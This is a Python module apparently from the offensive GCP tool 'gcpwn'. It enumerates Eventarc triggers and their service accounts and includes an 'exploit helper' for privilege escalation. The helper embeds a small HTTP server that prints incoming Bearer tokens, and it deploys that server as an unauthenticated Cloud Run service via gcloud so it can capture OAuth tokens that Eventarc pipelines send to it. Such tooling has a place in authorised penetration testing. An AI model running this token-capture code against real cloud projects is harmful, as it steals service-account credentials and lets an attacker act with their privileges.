from __future__ import annotations

import subprocess
import time
from typing import Any

import requests as _rlib

from gcpwn.core.console import UtilityTools
from gcpwn.core.resource import GcpListResource
from gcpwn.core.utils.module_helpers import (
    extract_path_segment,
    region_resolver_for,
)

_EVENTARC = "https://eventarc.googleapis.com/v1"
_PUBSUB = "https://pubsub.googleapis.com/v1"

_CAPTURE_IMAGE = "python:3.11-alpine"
_CAPTURE_APP = """\
import os
from http.server import BaseHTTPRequestHandler, HTTPServer

class H(BaseHTTPRequestHandler):
    def do_POST(self):
        auth_header = self.headers.get('Authorization', '')
        token = auth_header.removeprefix('Bearer ').strip()
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length) if length else b''
        print(f'GCPWN_EVENTARC_TOKEN={token}', flush=True)
        print(f'GCPWN_EVENTARC_BODY={body[:200]}', flush=True)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'captured')
    def log_message(self, *a): pass

port = int(os.environ.get('PORT', 8080))
HTTPServer(('', port), H).serve_forever()
"""


def _eventarc():
    """Import the eventarc_v1 GAPIC module lazily.

    Deferring the import keeps this module importable (for contract tests /
    enum_all listing) even if the optional ``google-cloud-eventarc`` client is
    absent, and only surfaces the missing dependency -- with a clear message --
    when someone actually runs the module.
    """
    try:
        from google.cloud import eventarc_v1
    except Exception as exc:
        raise RuntimeError(
            "Eventarc enumeration requires the `google-cloud-eventarc` package. "
            "Install it (pip install google-cloud-eventarc) to enumerate Eventarc triggers."
        ) from exc
    return eventarc_v1


resolve_locations = region_resolver_for("eventarc", ("eventarc", "v1"))


def _destination_details(raw: dict[str, Any]) -> tuple[str, str]:
    """Return (destination_type, destination_target) from a Trigger's destination oneof.

    A trigger fires its event to exactly one destination (cloud_run / cloud_function /
    gke / workflow / http_endpoint). The destination is the sink that gets invoked
    *as the trigger's service_account*, so surfacing which compute target a trigger
    drives -- next to that SA -- shows an operator exactly what an attacker who can
    create/update triggers (``eventarc.triggers.create``) could cause to run with the
    SA's identity. Returns ("", "") when no destination is set.
    """
    destination = raw.get("destination") if isinstance(raw.get("destination"), dict) else None
    if not destination:
        return "", ""

    cloud_run = destination.get("cloud_run")
    if isinstance(cloud_run, dict) and cloud_run:
        service = str(cloud_run.get("service") or "").strip()
        path = str(cloud_run.get("path") or "").strip()
        region = str(cloud_run.get("region") or "").strip()
        target = service
        if region:
            target = f"{service} ({region})" if service else region
        if path:
            target = f"{target}{path}" if target else path
        return "cloud_run", target

    cloud_function = destination.get("cloud_function")
    if isinstance(cloud_function, str) and cloud_function.strip():
        return "cloud_function", cloud_function.strip()

    gke = destination.get("gke")
    if isinstance(gke, dict) and gke:
        cluster = str(gke.get("cluster") or "").strip()
        namespace = str(gke.get("namespace") or "").strip()
        service = str(gke.get("service") or "").strip()
        path = str(gke.get("path") or "").strip()
        parts = [p for p in (cluster, namespace, service) if p]
        target = "/".join(parts)
        if path:
            target = f"{target}{path}" if target else path
        return "gke", target

    workflow = destination.get("workflow")
    if isinstance(workflow, str) and workflow.strip():
        return "workflow", workflow.strip()

    http_endpoint = destination.get("http_endpoint")
    if isinstance(http_endpoint, dict) and http_endpoint:
        return "http_endpoint", str(http_endpoint.get("uri") or "").strip()

    return "", ""


def _event_filters_summary(raw: dict[str, Any]) -> str:
    """Render a Trigger's event_filters as a compact ``attribute=value`` summary.

    The event_filters are the CloudEvents matchers that decide which events fire the
    trigger (e.g. ``type=google.cloud.audit.log.v1.written``,
    ``serviceName=storage.googleapis.com``). A compact join keeps the table readable
    while still showing what an operator is triggering on. "" when no filters.
    """
    filters = raw.get("event_filters")
    if not isinstance(filters, list):
        return ""
    parts: list[str] = []
    for entry in filters:
        if not isinstance(entry, dict):
            continue
        attribute = str(entry.get("attribute") or "").strip()
        value = str(entry.get("value") or "").strip()
        operator = str(entry.get("operator") or "").strip()
        if not attribute:
            continue
        if operator:
            parts.append(f"{attribute}[{operator}]={value}")
        else:
            parts.append(f"{attribute}={value}")
    return ", ".join(parts)


class EventarcPipelinesResource:
    """Exploit helper for Eventarc pipeline oauthToken PE."""

    def __init__(self, session):
        self.session = session

    @staticmethod
    def req(tok: str, method: str, url: str, body=None, params=None):
        hdrs = {"Authorization": f"Bearer {tok}", "Content-Type": "application/json"}
        fn = {"GET": _rlib.get, "POST": _rlib.post, "PUT": _rlib.put,
              "PATCH": _rlib.patch, "DELETE": _rlib.delete}[method]
        r = fn(url, headers=hdrs, json=body, params=params, timeout=30)
        try:
            return r.status_code, r.json()
        except Exception:
            return r.status_code, {"_raw": r.text[:600]}

    @staticmethod
    def lro_wait(tok: str, lro: str, timeout: int = 120) -> dict | None:
        deadline = time.time() + timeout
        while time.time() < deadline:
            time.sleep(8)
            hdrs = {"Authorization": f"Bearer {tok}"}
            r = _rlib.get(f"{_EVENTARC}/{lro}", headers=hdrs, timeout=30)
            try:
                data = r.json()
            except Exception:
                continue
            if r.status_code == 200 and data.get("done"):
                return data
        return None

    @staticmethod
    def deploy_capture_service(project: str, region: str):
        """Deploy a Cloud Run capture service; returns (url, svc_name) or (None, None)."""
        import pathlib
        import tempfile
        tmpdir = pathlib.Path(tempfile.mkdtemp(prefix="gcpwn-eventarc-capture-"))
        (tmpdir / "main.py").write_text(_CAPTURE_APP)
        (tmpdir / "Dockerfile").write_text(
            "FROM python:3.11-alpine\n"
            "WORKDIR /app\n"
            "COPY main.py .\n"
            "CMD [\"python\", \"main.py\"]\n"
        )
        svc_name = f"gcpwn-ea-capture-{int(time.time()) % 100000}"
        print(f"  Deploying Cloud Run capture service '{svc_name}' in {region}…")
        cmd = [
            "gcloud", "run", "deploy", svc_name,
            "--source", str(tmpdir),
            "--region", region,
            "--project", project,
            "--allow-unauthenticated",
            "--max-instances", "1",
            "--quiet",
            "--format", "value(status.url)",
        ]
        try:
            out = subprocess.check_output(cmd, stderr=subprocess.DEVNULL, timeout=300, text=True)
            url = out.strip()
            print(f"  {UtilityTools.GREEN}Capture URL: {url}{UtilityTools.RESET}")
            return url, svc_name
        except subprocess.CalledProcessError:
            print(f"  {UtilityTools.RED}gcloud run deploy failed. Try building manually and pass --capture-url.{UtilityTools.RESET}")
            return None, None
        except FileNotFoundError:
            print(f"  {UtilityTools.RED}gcloud not found. Pass --capture-url with an existing Cloud Run service.{UtilityTools.RESET}")
            return None, None


class EventarcTriggersResource(GcpListResource):
    """List/get Eventarc triggers via the eventarc_v1 EventarcClient (GcpListResource).

    The offensively interesting field is ``service_account``: a trigger invokes its
    destination *as that SA*, so a principal who can create or update triggers
    (``eventarc.triggers.create``/``.update``) gains an oracle to act as it. We capture
    that SA plus the destination (type + target) it drives, the channel (for
    third-party event sources), and a compact event_filters summary.

    EventarcClient exposes ``test_iam_permissions`` only via the inherited IAM-policy
    mixin (it is not a real Eventarc Trigger RPC -- it is absent from the service
    transport's wrapped methods), so the component runs with ``supports_iam=False``.
    """

    SERVICE_LABEL = "Eventarc"
    TABLE_NAME = "eventarc_triggers"
    COLUMNS = [
        "location",
        "trigger_id",
        "name",
        "service_account",
        "destination_type",
        "destination_target",
        "channel",
        "event_filters",
    ]
    ACTION_RESOURCE_TYPE = "triggers"
    LIST_PERMISSION = "eventarc.triggers.list"
    GET_PERMISSION = "eventarc.triggers.get"
    ID_FIELD = "trigger_id"

    def _build_client(self, session):
        return _eventarc().EventarcClient(credentials=session.credentials)

    def _list_items(self, parent, **_):
        return self.client.list_triggers(request=_eventarc().ListTriggersRequest(parent=parent))

    def _get_item(self, resource_id, **_):
        return self.client.get_trigger(request=_eventarc().GetTriggerRequest(name=resource_id))

    def _extra_save_fields(self, raw):
        destination_type, destination_target = _destination_details(raw)
        return {
            "trigger_id": extract_path_segment(str(raw.get("name", "") or ""), "triggers"),
            "service_account": str(raw.get("service_account", "") or ""),
            "destination_type": destination_type,
            "destination_target": destination_target,
            "channel": str(raw.get("channel", "") or ""),
            "event_filters": _event_filters_summary(raw),
        }
